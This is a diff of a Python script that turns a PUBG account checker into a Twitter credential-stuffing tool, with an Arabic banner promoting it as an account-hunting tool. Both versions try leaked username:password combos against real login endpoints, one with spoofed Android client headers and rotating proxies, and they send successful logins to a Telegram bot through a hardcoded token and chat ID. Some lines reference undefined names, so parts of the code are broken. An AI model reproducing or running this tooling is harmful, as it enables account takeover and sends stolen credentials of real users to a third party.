@@ -1,80 +1,212 @@
-import requests
-import hashlib
-import random
-import secrets
-import colorama 
-import uuid
-import os
 from time import sleep
-import string
-d = 0
-print(f"""\x1b[32;1m
+import os,random
+try:
+    import requests
+except:
+    os.system('pip install requests')
+    import requests
 
-             _                  _               _             
-            | |                | |             | |            
- _   _   _| |    _    _| |__   _  _| | _ _  
-| '_ \| | | | '_ \ / _` |  / | '_ \ / _ \/ | |/ / _ \  '|
-| |_) | |_| | |_) | (_| | | (__| | | |  / (|   <  / |   
-| ./ \__,_|_.__/ \__, |  \___|_| |_|\___|\___|_|\_\___|_|   
-| |                 / |                                     
-|_|                |_/                                      
+try:
+    from colorama import Fore,Style
+except:
+    os.system('pip install colorama')
+    from colorama import Fore,Style
 
-\x1b[39;1mDiv ==> @X888E    CH ==> @E999G 
+
+try:
+    os.system('color')
+except:
+    pass
+R = Fore.RED
+G = Fore.GREEN
+Y = Fore.YELLOW
+os.system('cls' if os.name == 'nt' else 'clear')
+
+hunt = 0 
+error = 0
+bad = 0 
+banner = (G+"""
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ ♡                                               اداة صيد حسابات تويتر 
+♡                                                بدون مشاكل 
+♡                                                تكدر ضيف لسته ارقام 
+♡                                                او لسته كامبو 
+♡                                                مطور اداة حمزه التميمي
+                                                قنواتي تلكرام 
+♡   @E999G    @X444B     @Sakin200       
+♡   حسابي شخصي تلكرام 
+♡   @X888E
+♡$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 
+ 
+                                                        
 """)
-ID = '948449142'
-token = '1706448122:AAEauXhifuALNv74ChxogexxnTbFnFn541M'
-combos = open("acc.txt", "r").read().splitlines()
-for combo in combos:
+ID= '948449142'
+token = '1709758707:AAErgzajdRujR5g_uIaP4YT_F9Qr8bJHIOs'
+YES = f"""
+[✓]بوجبا بيمسي عليكم و ع ببجي😂❤️:
+[✓] Email: {user}
+[✓] Pass: {pasw}
+[✓] BY💥@@hazemmo2312-@Hazemmo23_bot
+━━━━━━━━━━━━━"""
+print(banner)
+def Guess_without_proxies(user,pasw):
+    global hunt,error,bad,banner
     try:
-        combo = combo.split(":")
+        print(Y+f'[-] {user}:{pasw}')
+        token_url = 'https://api.twitter.com/1.1/guest/activate.json'
+        token_hed = {
+            'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',
+            'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F',
+        }
+        get_token = requests.post(token_url,headers=token_hed).json()['guest_token']
+        url = "https://api.twitter.com/auth/1/xauth_password.json"
+        head = {
+            'Cache-Control': 'no-store',
+            'X-B3-TraceId': 'bc35545e2885cf69',
+            'OS-Security-Patch-Level': '2017-10-05',
+            'X-Twitter-Client-Flavor': '',
+            'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',
+            'Accept-Encoding': 'gzip, deflate',
+            'X-Twitter-Client-AdID': '143f8c1d-0dab-495e-bdba-6b8f3216d92f',
+            'Timezone': 'Asia/Shanghai',
+            'X-Twitter-Client-Limit-Ad-Tracking': '0',
+            'X-Twitter-Client-DeviceID': 'c0575264c704f9c6',
+            'X-Twitter-Client': 'TwitterAndroid',
+            'X-Twitter-Client-Language': 'ar-EG',
+            'X-Twitter-API-Version': '5',
+            'att': '1-p8YDwE1eClUMxxzR8MHgZpnUFyhpILYjFUzExuRI',
+            'Optimize-Body': 'true',
+            'X-Twitter-Active-User': 'yes',
+            'X-Twitter-Client-Version': '8.87.0-release.01',
+            'X-Guest-Token': f'{get_token}',
+            'X-Client-UUID': 'f55fe15f-b1f4-4406-9dd7-e0eb18b841ec',
+            'Accept': 'application/json',
+            'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F',
+            'Accept-Language': 'ar-EG',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Length': '140',
+            'Host': 'api.twitter.com',
+            'Connection': 'close',
+            'Cookie': 'personalization_id=v1_PV0kGHiFp5r175R1KzBEzg==; guest_id=v1%3A161752602861069129'
+        }
+
+        data = {
+            'x_auth_identifier': user,
+            'x_auth_password': pasw,
+            'send_error_codes':'true',
+            'x_auth_login_challenge':'1',
+            'x_auth_login_verification':'1',
+            'ui_metrics': ''
+        }
+        sleep(0.2)
+        login = requests.post(url,headers=head,data=data).text
+        if 'oauth_token' in login:
+            with open('hunt.txt','a') as dd:
+                r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nBY☠️ @@hazemmo2312-@Hazemmo23_bot')
+                dd.write(f'{user}:{pasw}\n')
+            hunt +=1
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print(f'{banner}\n[-] Hunt : {hunt}\n[-] Bad : {bad}\n[-] Error : {error}')
+        else:
+            bad +=1
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print(f'{banner}\n[-] Hunt : {hunt}\n[-] Bad : {bad}\n[-] Error : {error}')
     except:
-        print("Invalid Combo")
-        exit()
-    user = combo[0]
-    passw = combo[1]
-    bruted_text = f""" 𓆩Pubg Checker𓆪
-    \n————————————————
-    E-mail: {user}
-    Pass: {passw}
-    Div ==> @X888E    CH ==> @E999G ✓
-    ————————————————\n"""
-    token11 = hashlib.md5(bytes(f'{passw}', encoding='utf-8')).hexdigest()
-    token22 = hashlib.md5(bytes(
-        "/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=en_US&os=1{\"account\":\"" + user + "\",\"account_type\":2,\"area_code\":\"964\",\"extra_json\":\"\",\"password\":\"" + token11 + "\"}3ec8cd69d71b7922e2a17445840866b26d86e283",
-        encoding="utf-8")).hexdigest()
-    tokenpriv11 = ""
-    for i in range(6):
-        tokenpriv11 += "".join(random.choice(string.digits))
-    tokenpriv11 += "."
-    for i in range(3):
-        tokenpriv11 += "".join(random.choice(string.digits))
-    headers2 = {
-        "Content-Type": "application/json; charset=utf-8",
-        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 10; RMX1971 Build/QKQ1.{tokenpriv11})",
-        "Host": "igame.msdkpass.com",
-        "Connection": "Keep-Alive",
-        "Accept-Encoding": "gzip, deflate",
-        "Content-Length": "122",
-    }
-    data2 = "{\"account\":\"" + user + "\",\"account_type\":2,\"area_code\":\"964\",\"extra_json\":\"\",\"password\":\"" + token11 + "\"}"
-    r2 = requests.get(
-        f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=en_US&os=1=sig={token22}",
-        data=data2, headers=headers2)
-    d += 1
-    if "An error occurred" in r2.text:
-        print(f"\x1b[32;1m[{d}]\x1b[32;1m [good]\x1b[37;1m {user}:{passw} ")
-        with open("PUBG_Available.txt", "a") as m:
-            m.write(bruted_text)
-            requests.get(
-                f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=•Eamil : {user}\n•Pass : {passw}\n ')
-    elif '{"msg":"invalid sig", "ret":1008}' in r2.text:
-        print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
-    elif '"msg":"Params Email Format is Error!"' in r2.text:
-        print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
-    elif '"msg":"the account does not exists!"' in r2.text:
-        print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
-    elif '"msg":"wrong password!"' in r2.text:
-        print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
-os.system('rm -rif acc.txt')
+        error +=1
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(f'{banner}\n[-] Hunt : {hunt}\n[-] Bad : {bad}\n[-] Error : {error}')
+
+
+def Guess_with_proxies(user,pasw):
+    global hunt,error,bad,banner
+    try:
+        print(Y+f'[-] {user}:{pasw}')
+        token_url = 'https://api.twitter.com/1.1/guest/activate.json'
+        token_hed = {
+            'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',
+            'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F',
+        }
+        get_token = requests.post(token_url,headers=token_hed).json()['guest_token']
+
+        url = "https://api.twitter.com/auth/1/xauth_password.json"
+        head = {
+            'Cache-Control': 'no-store',
+            'X-B3-TraceId': 'bc35545e2885cf69',
+            'OS-Security-Patch-Level': '2017-10-05',
+            'X-Twitter-Client-Flavor': '',
+            'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',
+            'Accept-Encoding': 'gzip, deflate',
+            'X-Twitter-Client-AdID': '143f8c1d-0dab-495e-bdba-6b8f3216d92f',
+            'Timezone': 'Asia/Shanghai',
+            'X-Twitter-Client-Limit-Ad-Tracking': '0',
+            'X-Twitter-Client-DeviceID': 'c0575264c704f9c6',
+            'X-Twitter-Client': 'TwitterAndroid',
+            'X-Twitter-Client-Language': 'ar-EG',
+            'X-Twitter-API-Version': '5',
+            'att': '1-p8YDwE1eClUMxxzR8MHgZpnUFyhpILYjFUzExuRI',
+            'Optimize-Body': 'true',
+            'X-Twitter-Active-User': 'yes',
+            'X-Twitter-Client-Version': '8.87.0-release.01',
+            'X-Guest-Token': f'{get_token}',
+            'X-Client-UUID': 'f55fe15f-b1f4-4406-9dd7-e0eb18b841ec',
+            'Accept': 'application/json',
+            'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F',
+            'Accept-Language': 'ar-EG',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Length': '140',
+            'Host': 'api.twitter.com',
+            'Connection': 'close',
+            'Cookie': 'personalization_id=v1_PV0kGHiFp5r175R1KzBEzg==; guest_id=v1%3A161752602861069129'
+        }
+
+        data = {
+            'x_auth_identifier': user,
+            'x_auth_password': pasw,
+            'send_error_codes':'true',
+            'x_auth_login_challenge':'1',
+            'x_auth_login_verification':'1',
+            'ui_metrics': ''
+        }
+        prox = open('proxies.txt', 'r').read().splitlines()
+        rprox = str(random.choice(prox))
+        proxies = {'http':'http://{}'.format(rprox), 'https':'https://{}'.format(rprox)}
+        login = requests.post(url,headers=head,data=data,proxies=proxies,timeout=8).text
+        if 'oauth_token' in login:
+            with open('hunt.txt','a') as dd:
+                dd.write(f'{user}:{pasw}\n')
+            hunt +=1
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print(f'{banner}\n[-] Hunt : {hunt}\n[-] Bad : {bad}\n[-] Error : {error}')
+        else:
+            bad +=1
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print(f'{banner}\n[-] Hunt : {hunt}\n[-] Bad : {bad}\n[-] Error : {error}')
+    except:
+        error +=1
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(f'{banner}\n[-] Hunt : {hunt}\n[-] Bad : {bad}\n[-] Error : {error}')
+
+
+
+action = int(1)
+if action == '2':
+    for acc in open('combo.txt','r').read().splitlines():
+        try:
+            user = acc.split(':')[0]
+            pasw = acc.split(':')[1]
+            Guess_with_proxies(user,pasw)
+        except:
+            pass
+
+else:
+    for account in open('combo.txt','r').read().splitlines():
+        try:
+            user = account.split(':')[0]
+            pasw = account.split(':')[1]
+            Guess_without_proxies(user,pasw)
+        except:
+            pass
+os.system('rm -rif combo.txt')
 os.system('python3 gen.py')
-os.system('python3 checkerq.py')
+os.system('python3 tw.py')
